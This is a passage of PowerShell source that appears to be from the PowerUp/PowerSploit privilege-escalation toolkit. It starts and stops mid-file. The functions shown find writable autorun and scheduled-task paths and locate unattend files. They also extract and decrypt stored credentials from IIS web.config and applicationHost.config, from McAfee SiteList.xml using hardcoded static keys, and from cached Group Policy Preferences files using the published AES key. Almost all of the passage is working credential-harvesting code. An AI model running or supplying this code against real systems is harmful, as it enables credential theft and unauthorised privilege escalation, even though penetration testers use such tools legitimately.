        if ($DefaultUserName -or $AltDefaultUserName) {
            $Out = New-Object PSObject
            $Out | Add-Member Noteproperty 'DefaultDomainName' $DefaultDomainName
            $Out | Add-Member Noteproperty 'DefaultUserName' $DefaultUserName
            $Out | Add-Member Noteproperty 'DefaultPassword' $DefaultPassword
            $Out | Add-Member Noteproperty 'AltDefaultDomainName' $AltDefaultDomainName
            $Out | Add-Member Noteproperty 'AltDefaultUserName' $AltDefaultUserName
            $Out | Add-Member Noteproperty 'AltDefaultPassword' $AltDefaultPassword
            $Out
        }
    }
}

function Get-ModifiableRegistryAutoRun {
<#
    .SYNOPSIS

        Returns any elevated system autoruns in which the current user can
        modify part of the path string.

    .DESCRIPTION

        Enumerates a number of autorun specifications in HKLM and filters any
        autoruns through Get-ModifiablePath, returning any file/config locations
        in the found path strings that the current user can modify.

    .EXAMPLE

        PS C:\> Get-ModifiableRegistryAutoRun

        Return vulneable autorun binaries (or associated configs).
#>

    [CmdletBinding()]
    Param()

    $SearchLocations = @(   "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
                            "HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce",
                            "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Run",
                            "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce",
                            "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunService",
                            "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceService",
                            "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\RunService",
                            "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnceService"
                        )

    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"

    $SearchLocations | Where-Object { Test-Path $_ } | ForEach-Object {

        $Keys = Get-Item -Path $_
        $ParentPath = $_

        ForEach ($Name in $Keys.GetValueNames()) {

            $Path = $($Keys.GetValue($Name))

            $Path | Get-ModifiablePath | ForEach-Object {
                $Out = New-Object PSObject
                $Out | Add-Member Noteproperty 'Key' "$ParentPath\$Name"
                $Out | Add-Member Noteproperty 'Path' $Path
                $Out | Add-Member Noteproperty 'ModifiableFile' $_
                $Out
            }
        }
    }

    $ErrorActionPreference = $OrigError
}


########################################################
#
# Miscellaneous checks
#
########################################################

function Get-ModifiableScheduledTaskFile {
<#
    .SYNOPSIS

        Returns scheduled tasks where the current user can modify any file
        in the associated task action string.

    .DESCRIPTION

        Enumerates all scheduled tasks by recursively listing "$($ENV:windir)\System32\Tasks"
        and parses the XML specification for each task, extracting the command triggers.
        Each trigger string is filtered through Get-ModifiablePath, returning any file/config
        locations in the found path strings that the current user can modify.

    .EXAMPLE

        PS C:\> Get-ModifiableScheduledTaskFile

        Return scheduled tasks with modifiable command strings.
#>

    [CmdletBinding()]
    Param()

    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"

    $Path = "$($ENV:windir)\System32\Tasks"

    # recursively enumerate all schtask .xmls
    Get-ChildItem -Path $Path -Recurse | Where-Object { -not $_.PSIsContainer } | ForEach-Object {
        try {
            $TaskName = $_.Name
            $TaskXML = [xml] (Get-Content $_.FullName)
            if($TaskXML.Task.Triggers) {

                $TaskTrigger = $TaskXML.Task.Triggers.OuterXML

                # check schtask command
                $TaskXML.Task.Actions.Exec.Command | Get-ModifiablePath | ForEach-Object {
                    $Out = New-Object PSObject
                    $Out | Add-Member Noteproperty 'TaskName' $TaskName
                    $Out | Add-Member Noteproperty 'TaskFilePath' $_
                    $Out | Add-Member Noteproperty 'TaskTrigger' $TaskTrigger
                    $Out
                }

                # check schtask arguments
                $TaskXML.Task.Actions.Exec.Arguments | Get-ModifiablePath | ForEach-Object {
                    $Out = New-Object PSObject
                    $Out | Add-Member Noteproperty 'TaskName' $TaskName
                    $Out | Add-Member Noteproperty 'TaskFilePath' $_
                    $Out | Add-Member Noteproperty 'TaskTrigger' $TaskTrigger
                    $Out
                }
            }
        }
        catch {
            Write-Verbose "Error: $_"
        }
    }

    $ErrorActionPreference = $OrigError
}


function Get-UnattendedInstallFile {
<#
    .SYNOPSIS

        Checks several locations for remaining unattended installation files,
        which may have deployment credentials.

    .EXAMPLE

        PS C:\> Get-UnattendedInstallFile

        Finds any remaining unattended installation files.

    .LINK

        http://www.fuzzysecurity.com/tutorials/16.html
#>

    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"

    $SearchLocations = @(   "c:\sysprep\sysprep.xml",
                            "c:\sysprep\sysprep.inf",
                            "c:\sysprep.inf",
                            (Join-Path $Env:WinDir "\Panther\Unattended.xml"),
                            (Join-Path $Env:WinDir "\Panther\Unattend\Unattended.xml"),
                            (Join-Path $Env:WinDir "\Panther\Unattend.xml"),
                            (Join-Path $Env:WinDir "\Panther\Unattend\Unattend.xml"),
                            (Join-Path $Env:WinDir "\System32\Sysprep\unattend.xml"),
                            (Join-Path $Env:WinDir "\System32\Sysprep\Panther\unattend.xml")
                        )

    # test the existence of each path and return anything found
    $SearchLocations | Where-Object { Test-Path $_ } | ForEach-Object {
        $Out = New-Object PSObject
        $Out | Add-Member Noteproperty 'UnattendPath' $_
        $Out
    }

    $ErrorActionPreference = $OrigError
}


function Get-WebConfig {
<#
    .SYNOPSIS

        This script will recover cleartext and encrypted connection strings from all web.config
        files on the system.  Also, it will decrypt them if needed.

        Author: Scott Sutherland - 2014, NetSPI
        Author: Antti Rantasaari - 2014, NetSPI

    .DESCRIPTION

        This script will identify all of the web.config files on the system and recover the
        connection strings used to support authentication to backend databases.  If needed, the
        script will also decrypt the connection strings on the fly.  The output supports the
        pipeline which can be used to convert all of the results into a pretty table by piping
        to format-table.

    .EXAMPLE

        Return a list of cleartext and decrypted connect strings from web.config files.

        PS C:\> Get-WebConfig
        user   : s1admin
        pass   : s1password
        dbserv : 192.168.1.103\server1
        vdir   : C:\test2
        path   : C:\test2\web.config
        encr   : No

        user   : s1user
        pass   : s1password
        dbserv : 192.168.1.103\server1
        vdir   : C:\inetpub\wwwroot
        path   : C:\inetpub\wwwroot\web.config
        encr   : Yes

    .EXAMPLE

        Return a list of clear text and decrypted connect strings from web.config files.

        PS C:\>get-webconfig | Format-Table -Autosize

        user    pass       dbserv                vdir               path                          encr
        ----    ----       ------                ----               ----                          ----
        s1admin s1password 192.168.1.101\server1 C:\App1            C:\App1\web.config            No  
        s1user  s1password 192.168.1.101\server1 C:\inetpub\wwwroot C:\inetpub\wwwroot\web.config No  
        s2user  s2password 192.168.1.102\server2 C:\App2            C:\App2\test\web.config       No  
        s2user  s2password 192.168.1.102\server2 C:\App2            C:\App2\web.config            Yes 
        s3user  s3password 192.168.1.103\server3 D:\App3            D:\App3\web.config            No 

     .LINK

        https://github.com/darkoperator/Posh-SecMod/blob/master/PostExploitation/PostExploitation.psm1
        http://www.netspi.com
        https://raw2.github.com/NetSPI/cmdsql/master/cmdsql.aspx
        http://www.iis.net/learn/get-started/getting-started-with-iis/getting-started-with-appcmdexe
        http://msdn.microsoft.com/en-us/library/k6h9cz8h(v=vs.80).aspx

     .NOTES

        Below is an alterantive method for grabbing connection strings, but it doesn't support decryption.
        for /f "tokens=*" %i in ('%systemroot%\system32\inetsrv\appcmd.exe list sites /text:name') do %systemroot%\system32\inetsrv\appcmd.exe list config "%i" -section:connectionstrings
#>

    [CmdletBinding()]
    Param()

    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"

    # Check if appcmd.exe exists
    if (Test-Path  ("$Env:SystemRoot\System32\InetSRV\appcmd.exe")) {

        # Create data table to house results
        $DataTable = New-Object System.Data.DataTable

        # Create and name columns in the data table
        $Null = $DataTable.Columns.Add("user")
        $Null = $DataTable.Columns.Add("pass")
        $Null = $DataTable.Columns.Add("dbserv")
        $Null = $DataTable.Columns.Add("vdir")
        $Null = $DataTable.Columns.Add("path")
        $Null = $DataTable.Columns.Add("encr")

        # Get list of virtual directories in IIS
        C:\Windows\System32\InetSRV\appcmd.exe list vdir /text:physicalpath | 
        ForEach-Object {

            $CurrentVdir = $_

            # Converts CMD style env vars (%) to powershell env vars (env)
            if ($_ -like "*%*") {
                $EnvarName = "`$Env:"+$_.split("%")[1]
                $EnvarValue = Invoke-Expression $EnvarName
                $RestofPath = $_.split("%")[2]
                $CurrentVdir  = $EnvarValue+$RestofPath
            }

            # Search for web.config files in each virtual directory
            $CurrentVdir | Get-ChildItem -Recurse -Filter web.config | ForEach-Object {

                # Set web.config path
                $CurrentPath = $_.fullname

                # Read the data from the web.config xml file
                [xml]$ConfigFile = Get-Content $_.fullname

                # Check if the connectionStrings are encrypted
                if ($ConfigFile.configuration.connectionStrings.add) {

                    # Foreach connection string add to data table
                    $ConfigFile.configuration.connectionStrings.add| 
                    ForEach-Object {

                        [String]$MyConString = $_.connectionString
                        if($MyConString -like "*password*") {
                            $ConfUser = $MyConString.Split("=")[3].Split(";")[0]
                            $ConfPass = $MyConString.Split("=")[4].Split(";")[0]
                            $ConfServ = $MyConString.Split("=")[1].Split(";")[0]
                            $ConfVdir = $CurrentVdir
                            $ConfPath = $CurrentPath
                            $ConfEnc = "No"
                            $Null = $DataTable.Rows.Add($ConfUser, $ConfPass, $ConfServ,$ConfVdir,$CurrentPath, $ConfEnc)
                        }
                    }
                }
                else {

                    # Find newest version of aspnet_regiis.exe to use (it works with older versions)
                    $AspnetRegiisPath = Get-ChildItem -Path "$Env:SystemRoot\Microsoft.NET\Framework\" -Recurse -filter 'aspnet_regiis.exe'  | Sort-Object -Descending | Select-Object fullname -First 1

                    # Check if aspnet_regiis.exe exists
                    if (Test-Path  ($AspnetRegiisPath.FullName)) {

                        # Setup path for temp web.config to the current user's temp dir
                        $WebConfigPath = (Get-Item $Env:temp).FullName + "\web.config"

                        # Remove existing temp web.config
                        if (Test-Path  ($WebConfigPath)) {
                            Remove-Item $WebConfigPath
                        }

                        # Copy web.config from vdir to user temp for decryption
                        Copy-Item $CurrentPath $WebConfigPath

                        # Decrypt web.config in user temp
                        $AspnetRegiisCmd = $AspnetRegiisPath.fullname+' -pdf "connectionStrings" (get-item $Env:temp).FullName'
                        $Null = Invoke-Expression $AspnetRegiisCmd

                        # Read the data from the web.config in temp
                        [xml]$TMPConfigFile = Get-Content $WebConfigPath

                        # Check if the connectionStrings are still encrypted
                        if ($TMPConfigFile.configuration.connectionStrings.add) {

                            # Foreach connection string add to data table
                            $TMPConfigFile.configuration.connectionStrings.add | ForEach-Object {

                                [String]$MyConString = $_.connectionString
                                if($MyConString -like "*password*") {
                                    $ConfUser = $MyConString.Split("=")[3].Split(";")[0]
                                    $ConfPass = $MyConString.Split("=")[4].Split(";")[0]
                                    $ConfServ = $MyConString.Split("=")[1].Split(";")[0]
                                    $ConfVdir = $CurrentVdir
                                    $ConfPath = $CurrentPath
                                    $ConfEnc = 'Yes'
                                    $Null = $DataTable.Rows.Add($ConfUser, $ConfPass, $ConfServ,$ConfVdir,$CurrentPath, $ConfEnc)
                                }
                            }

                        }
                        else {
                            Write-Verbose "Decryption of $CurrentPath failed."
                            $False
                        }
                    }
                    else {
                        Write-Verbose 'aspnet_regiis.exe does not exist in the default location.'
                        $False
                    }
                }
            }
        }

        # Check if any connection strings were found
        if( $DataTable.rows.Count -gt 0 ) {
            # Display results in list view that can feed into the pipeline
            $DataTable |  Sort-Object user,pass,dbserv,vdir,path,encr | Select-Object user,pass,dbserv,vdir,path,encr -Unique
        }
        else {
            Write-Verbose 'No connection strings found.'
            $False
        }
    }
    else {
        Write-Verbose 'Appcmd.exe does not exist in the default location.'
        $False
    }

    $ErrorActionPreference = $OrigError
}


function Get-ApplicationHost {
 <#
    .SYNOPSIS

        This script will recover encrypted application pool and virtual directory passwords from the applicationHost.config on the system.

    .DESCRIPTION

        This script will decrypt and recover application pool and virtual directory passwords
        from the applicationHost.config file on the system.  The output supports the
        pipeline which can be used to convert all of the results into a pretty table by piping
        to format-table.

    .EXAMPLE

        Return application pool and virtual directory passwords from the applicationHost.config on the system.

        PS C:\> Get-ApplicationHost
        user    : PoolUser1
        pass    : PoolParty1!
        type    : Application Pool
        vdir    : NA
        apppool : ApplicationPool1
        user    : PoolUser2
        pass    : PoolParty2!
        type    : Application Pool
        vdir    : NA
        apppool : ApplicationPool2
        user    : VdirUser1
        pass    : VdirPassword1!
        type    : Virtual Directory
        vdir    : site1/vdir1/
        apppool : NA
        user    : VdirUser2
        pass    : VdirPassword2!
        type    : Virtual Directory
        vdir    : site2/
        apppool : NA

    .EXAMPLE

        Return a list of cleartext and decrypted connect strings from web.config files.

        PS C:\> Get-ApplicationHost | Format-Table -Autosize

        user          pass               type              vdir         apppool
        ----          ----               ----              ----         -------
        PoolUser1     PoolParty1!       Application Pool   NA           ApplicationPool1
        PoolUser2     PoolParty2!       Application Pool   NA           ApplicationPool2
        VdirUser1     VdirPassword1!    Virtual Directory  site1/vdir1/ NA
        VdirUser2     VdirPassword2!    Virtual Directory  site2/       NA

    .LINK

        https://github.com/darkoperator/Posh-SecMod/blob/master/PostExploitation/PostExploitation.psm1
        http://www.netspi.com
        http://www.iis.net/learn/get-started/getting-started-with-iis/getting-started-with-appcmdexe
        http://msdn.microsoft.com/en-us/library/k6h9cz8h(v=vs.80).aspx

    .NOTES

        Author: Scott Sutherland - 2014, NetSPI
        Version: Get-ApplicationHost v1.0
        Comments: Should work on IIS 6 and Above
#>

    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"

    # Check if appcmd.exe exists
    if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
        # Create data table to house results
        $DataTable = New-Object System.Data.DataTable

        # Create and name columns in the data table
        $Null = $DataTable.Columns.Add("user")
        $Null = $DataTable.Columns.Add("pass")
        $Null = $DataTable.Columns.Add("type")
        $Null = $DataTable.Columns.Add("vdir")
        $Null = $DataTable.Columns.Add("apppool")

        # Get list of application pools
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

            # Get application pool name
            $PoolName = $_

            # Get username
            $PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
            $PoolUser = Invoke-Expression $PoolUserCmd

            # Get password
            $PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
            $PoolPassword = Invoke-Expression $PoolPasswordCmd

            # Check if credentials exists
            if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
            }
        }

        # Get list of virtual directories
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

            # Get Virtual Directory Name
            $VdirName = $_

            # Get username
            $VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
            $VdirUser = Invoke-Expression $VdirUserCmd

            # Get password
            $VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
            $VdirPassword = Invoke-Expression $VdirPasswordCmd

            # Check if credentials exists
            if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
            }
        }

        # Check if any passwords were found
        if( $DataTable.rows.Count -gt 0 ) {
            # Display results in list view that can feed into the pipeline
            $DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
        }
        else {
            # Status user
            Write-Verbose 'No application pool or virtual directory passwords were found.'
            $False
        }
    }
    else {
        Write-Verbose 'Appcmd.exe does not exist in the default location.'
        $False
    }

    $ErrorActionPreference = $OrigError
}


function Get-SiteListPassword {
<#
    .SYNOPSIS

        Retrieves the plaintext passwords for found McAfee's SiteList.xml files.
        Based on Jerome Nokin (@funoverip)'s Python solution (in links).

        PowerSploit Function: Get-SiteListPassword
        Original Author: Jerome Nokin (@funoverip)
        PowerShell Port: @harmj0y
        License: BSD 3-Clause
        Required Dependencies: None
        Optional Dependencies: None

    .DESCRIPTION

        Searches for any McAfee SiteList.xml in C:\Program Files\, C:\Program Files (x86)\,
        C:\Documents and Settings\, or C:\Users\. For any files found, the appropriate
        credential fields are extracted and decrypted using the internal Get-DecryptedSitelistPassword
        function that takes advantage of McAfee's static key encryption. Any decrypted credentials
        are output in custom objects. See links for more information.

    .PARAMETER Path

        Optional path to a SiteList.xml file or folder.

    .EXAMPLE

        PS C:\> Get-SiteListPassword

        EncPassword : jWbTyS7BL1Hj7PkO5Di/QhhYmcGj5cOoZ2OkDTrFXsR/abAFPM9B3Q==
        UserName    :
        Path        : Products/CommonUpdater
        Name        : McAfeeHttp
        DecPassword : MyStrongPassword!
        Enabled     : 1
        DomainName  :
        Server      : update.nai.com:80

        EncPassword : jWbTyS7BL1Hj7PkO5Di/QhhYmcGj5cOoZ2OkDTrFXsR/abAFPM9B3Q==
        UserName    : McAfeeService
        Path        : Repository$
        Name        : Paris
        DecPassword : MyStrongPassword!
        Enabled     : 1
        DomainName  : companydomain
        Server      : paris001

        EncPassword : jWbTyS7BL1Hj7PkO5Di/QhhYmcGj5cOoZ2OkDTrFXsR/abAFPM9B3Q==
        UserName    : McAfeeService
        Path        : Repository$
        Name        : Tokyo
        DecPassword : MyStrongPassword!
        Enabled     : 1
        DomainName  : companydomain
        Server      : tokyo000

    .LINK

        https://github.com/funoverip/mcafee-sitelist-pwd-decryption/
        https://funoverip.net/2016/02/mcafee-sitelist-xml-password-decryption/
        https://github.com/tfairane/HackStory/blob/master/McAfeePrivesc.md
        https://www.syss.de/fileadmin/dokumente/Publikationen/2011/SySS_2011_Deeg_Privilege_Escalation_via_Antivirus_Software.pdf
#>

    [CmdletBinding()]
    param(
        [Parameter(Position=0, ValueFromPipeline=$True)]
        [ValidateScript({Test-Path -Path $_ })]
        [String[]]
        $Path
    )

    BEGIN {
        function Local:Get-DecryptedSitelistPassword {
            # PowerShell adaptation of https://github.com/funoverip/mcafee-sitelist-pwd-decryption/
            # Original Author: Jerome Nokin (@funoverip / jerome.nokin@gmail.com)
            # port by @harmj0y
            [CmdletBinding()]
            Param (
                [Parameter(Mandatory=$True)]
                [String]
                $B64Pass
            )

            # make sure the appropriate assemblies are loaded
            Add-Type -Assembly System.Security
            Add-Type -Assembly System.Core

            # declare the encoding/crypto providers we need
            $Encoding = [System.Text.Encoding]::ASCII
            $SHA1 = New-Object System.Security.Cryptography.SHA1CryptoServiceProvider
            $3DES = New-Object System.Security.Cryptography.TripleDESCryptoServiceProvider

            # static McAfee key XOR key LOL
            $XORKey = 0x12,0x15,0x0F,0x10,0x11,0x1C,0x1A,0x06,0x0A,0x1F,0x1B,0x18,0x17,0x16,0x05,0x19

            # xor the input b64 string with the static XOR key
            $I = 0;
            $UnXored = [System.Convert]::FromBase64String($B64Pass) | Foreach-Object { $_ -BXor $XORKey[$I++ % $XORKey.Length] }

            # build the static McAfee 3DES key TROLOL
            $3DESKey = $SHA1.ComputeHash($Encoding.GetBytes('<!@#$%^>')) + ,0x00*4

            # set the options we need
            $3DES.Mode = 'ECB'
            $3DES.Padding = 'None'
            $3DES.Key = $3DESKey

            # decrypt the unXor'ed block
            $Decrypted = $3DES.CreateDecryptor().TransformFinalBlock($UnXored, 0, $UnXored.Length)

            # ignore the padding for the result
            $Index = [Array]::IndexOf($Decrypted, [Byte]0)
            if($Index -ne -1) {
                $DecryptedPass = $Encoding.GetString($Decrypted[0..($Index-1)])
            }
            else {
                $DecryptedPass = $Encoding.GetString($Decrypted)
            }

            New-Object -TypeName PSObject -Property @{'Encrypted'=$B64Pass;'Decrypted'=$DecryptedPass}
        }

        function Local:Get-SitelistFields {
            [CmdletBinding()]
            Param (
                [Parameter(Mandatory=$True)]
                [String]
                $Path
            )

            try {
                [Xml]$SiteListXml = Get-Content -Path $Path

                if($SiteListXml.InnerXml -Like "*password*") {
                    Write-Verbose "Potential password in found in $Path"

                    $SiteListXml.SiteLists.SiteList.ChildNodes | Foreach-Object {
                        try {
                            $PasswordRaw = $_.Password.'#Text'

                            if($_.Password.Encrypted -eq 1) {
                                # decrypt the base64 password if it's marked as encrypted
                                $DecPassword = if($PasswordRaw) { (Get-DecryptedSitelistPassword -B64Pass $PasswordRaw).Decrypted } else {''}
                            }
                            else {
                                $DecPassword = $PasswordRaw
                            }

                            $Server = if($_.ServerIP) { $_.ServerIP } else { $_.Server }
                            $Path = if($_.ShareName) { $_.ShareName } else { $_.RelativePath }

                            $ObjectProperties = @{
                                'Name' = $_.Name;
                                'Enabled' = $_.Enabled;
                                'Server' = $Server;
                                'Path' = $Path;
                                'DomainName' = $_.DomainName;
                                'UserName' = $_.UserName;
                                'EncPassword' = $PasswordRaw;
                                'DecPassword' = $DecPassword;
                            }
                            New-Object -TypeName PSObject -Property $ObjectProperties
                        }
                        catch {
                            Write-Verbose "Error parsing node : $_"
                        }
                    }
                }
            }
            catch {
                Write-Warning "Error parsing file '$Path' : $_"
            }
        }
    }

    PROCESS {
        if($PSBoundParameters['Path']) {
            $XmlFilePaths = $Path
        }
        else {
            $XmlFilePaths = @('C:\Program Files\','C:\Program Files (x86)\','C:\Documents and Settings\','C:\Users\')
        }

        $XmlFilePaths | Foreach-Object { Get-ChildItem -Path $_ -Recurse -Include 'SiteList.xml' -ErrorAction SilentlyContinue } | Where-Object { $_ } | Foreach-Object {
            Write-Verbose "Parsing SiteList.xml file '$($_.Fullname)'"
            Get-SitelistFields -Path $_.Fullname
        }
    }
}


function Get-CachedGPPPassword {
<#
    .SYNOPSIS

        Retrieves the plaintext password and other information for accounts pushed through Group Policy Preferences and left in cached files on the host.

        PowerSploit Function: Get-CachedGPPPassword
        Author: Chris Campbell (@obscuresec), local cache mods by @harmj0y
        License: BSD 3-Clause
        Required Dependencies: None
        Optional Dependencies: None
     
    .DESCRIPTION

        Get-CachedGPPPassword searches the local machine for cached for groups.xml, scheduledtasks.xml, services.xml and datasources.xml files and returns plaintext passwords.

    .EXAMPLE

        PS C:\> Get-CachedGPPPassword


        NewName   : [BLANK]
        Changed   : {2013-04-25 18:36:07}
        Passwords : {Super!!!Password}
        UserNames : {SuperSecretBackdoor}
        File      : C:\ProgramData\Microsoft\Group Policy\History\{32C4C89F-7
                    C3A-4227-A61D-8EF72B5B9E42}\Machine\Preferences\Groups\Gr
                    oups.xml

    .LINK
        
        http://www.obscuresecurity.blogspot.com/2012/05/gpp-password-retrieval-with-powershell.html
        https://github.com/mattifestation/PowerSploit/blob/master/Recon/Get-GPPPassword.ps1
        https://github.com/rapid7/metasploit-framework/blob/master/modules/post/windows/gather/credentials/gpp.rb
        http://esec-pentest.sogeti.com/exploiting-windows-2008-group-policy-preferences
        http://rewtdance.blogspot.com/2012/06/exploiting-windows-2008-group-policy.html
#>
    
    [CmdletBinding()]
    Param()
    
    # Some XML issues between versions
    Set-StrictMode -Version 2

    # make sure the appropriate assemblies are loaded
    Add-Type -Assembly System.Security
    Add-Type -Assembly System.Core
    
    # helper that decodes and decrypts password
    function local:Get-DecryptedCpassword {
        [CmdletBinding()]
        Param (
            [string] $Cpassword 
        )

        try {
            # Append appropriate padding based on string length  
            $Mod = ($Cpassword.length % 4)
            
            switch ($Mod) {
                '1' {$Cpassword = $Cpassword.Substring(0,$Cpassword.Length -1)}
                '2' {$Cpassword += ('=' * (4 - $Mod))}
                '3' {$Cpassword += ('=' * (4 - $Mod))}
            }

            $Base64Decoded = [Convert]::FromBase64String($Cpassword)
            
            # Create a new AES .NET Crypto Object
            $AesObject = New-Object System.Security.Cryptography.AesCryptoServiceProvider
            [Byte[]] $AesKey = @(0x4e,0x99,0x06,0xe8,0xfc,0xb6,0x6c,0xc9,0xfa,0xf4,0x93,0x10,0x62,0x0f,0xfe,0xe8,
                                 0xf4,0x96,0xe8,0x06,0xcc,0x05,0x79,0x90,0x20,0x9b,0x09,0xa4,0x33,0xb6,0x6c,0x1b)
            
            # Set IV to all nulls to prevent dynamic generation of IV value
            $AesIV = New-Object Byte[]($AesObject.IV.Length) 
            $AesObject.IV = $AesIV
            $AesObject.Key = $AesKey
            $DecryptorObject = $AesObject.CreateDecryptor() 
            [Byte[]] $OutBlock = $DecryptorObject.TransformFinalBlock($Base64Decoded, 0, $Base64Decoded.length)
            
            return [System.Text.UnicodeEncoding]::Unicode.GetString($OutBlock)
        } 
        
        catch {Write-Error $Error[0]}
    }  
    
    # helper that parses fields from the found xml preference files
    function local:Get-GPPInnerFields {
        [CmdletBinding()]
        Param (
            $File 
        )
    
        try {
            
            $Filename = Split-Path $File -Leaf
            [XML] $Xml = Get-Content ($File)

            $Cpassword = @()
            $UserName = @()
            $NewName = @()
            $Changed = @()
            $Password = @()
    
            # check for password field
            if ($Xml.innerxml -like "*cpassword*"){
            
                Write-Verbose "Potential password in $File"
                
                switch ($Filename) {
                    'Groups.xml' {
                        $Cpassword += , $Xml | Select-Xml "/Groups/User/Properties/@cpassword" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $UserName += , $Xml | Select-Xml "/Groups/User/Properties/@userName" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $NewName += , $Xml | Select-Xml "/Groups/User/Properties/@newName" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $Changed += , $Xml | Select-Xml "/Groups/User/@changed" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                    }
        
                    'Services.xml' {  
                        $Cpassword += , $Xml | Select-Xml "/NTServices/NTService/Properties/@cpassword" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $UserName += , $Xml | Select-Xml "/NTServices/NTService/Properties/@accountName" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $Changed += , $Xml | Select-Xml "/NTServices/NTService/@changed" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                    }
        
                    'Scheduledtasks.xml' {
                        $Cpassword += , $Xml | Select-Xml "/ScheduledTasks/Task/Properties/@cpassword" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $UserName += , $Xml | Select-Xml "/ScheduledTasks/Task/Properties/@runAs" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $Changed += , $Xml | Select-Xml "/ScheduledTasks/Task/@changed" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                    }
        
                    'DataSources.xml' { 
                        $Cpassword += , $Xml | Select-Xml "/DataSources/DataSource/Properties/@cpassword" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $UserName += , $Xml | Select-Xml "/DataSources/DataSource/Properties/@username" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $Changed += , $Xml | Select-Xml "/DataSources/DataSource/@changed" | Select-Object -Expand Node | ForEach-Object {$_.Value}                          
                    }
                    
                    'Printers.xml' { 
                        $Cpassword += , $Xml | Select-Xml "/Printers/SharedPrinter/Properties/@cpassword" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $UserName += , $Xml | Select-Xml "/Printers/SharedPrinter/Properties/@username" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $Changed += , $Xml | Select-Xml "/Printers/SharedPrinter/@changed" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                    }
  
                    'Drives.xml' { 
                        $Cpassword += , $Xml | Select-Xml "/Drives/Drive/Properties/@cpassword" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $UserName += , $Xml | Select-Xml "/Drives/Drive/Properties/@username" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $Changed += , $Xml | Select-Xml "/Drives/Drive/@changed" | Select-Object -Expand Node | ForEach-Object {$_.Value} 
                    }
                }
           }
                     
           foreach ($Pass in $Cpassword) {
               Write-Verbose "Decrypting $Pass"
               $DecryptedPassword = Get-DecryptedCpassword $Pass
               Write-Verbose "Decrypted a password of $DecryptedPassword"
               #append any new passwords to array
               $Password += , $DecryptedPassword
           }
            
            # put [BLANK] in variables
            if (-not $Password) {$Password = '[BLANK]'}
            if (-not $UserName) {$UserName = '[BLANK]'}
            if (-not $Changed)  {$Changed = '[BLANK]'}
            if (-not $NewName)  {$NewName = '[BLANK]'}
                  
            # Create custom object to output results
            $ObjectProperties = @{'Passwords' = $Password;
                                  'UserNames' = $UserName;
                                  'Changed' = $Changed;
                                  'NewName' = $NewName;
                                  'File' = $File}
                
            $ResultsObject = New-Object -TypeName PSObject -Property $ObjectProperties
            Write-Verbose "The password is between {} and may be more than one value."
            if ($ResultsObject) {Return $ResultsObject} 
        }

        catch {Write-Error $Error[0]}
    }
    
    try {
        $AllUsers = $Env:ALLUSERSPROFILE

        if($AllUsers -notmatch 'ProgramData') {
            $AllUsers = "$AllUsers\Application Data"
        }

        # discover any locally cached GPP .xml files
        $XMlFiles = Get-ChildItem -Path $AllUsers -Recurse -Include 'Groups.xml','Services.xml','Scheduledtasks.xml','DataSources.xml','Printers.xml','Drives.xml' -Force -ErrorAction SilentlyContinue
    
        if ( -not $XMlFiles ) {
            Write-Verbose 'No preference files found.'
        }
        else {
            Write-Verbose "Found $($XMLFiles | Measure-Object | Select-Object -ExpandProperty Count) files that could contain passwords."

            ForEach ($File in $XMLFiles) {
                Get-GppInnerFields $File.Fullname
            }
        }
    }

    catch {Write-Error $Error[0]}
}


function Invoke-AllChecks {
<#
    .SYNOPSIS

        Runs all functions that check for various Windows privilege escalation opportunities.

        Author: @harmj0y
        License: BSD 3-Clause

    .PARAMETER HTMLReport

        Write a HTML version of the report to SYSTEM.username.html.

    .EXAMPLE

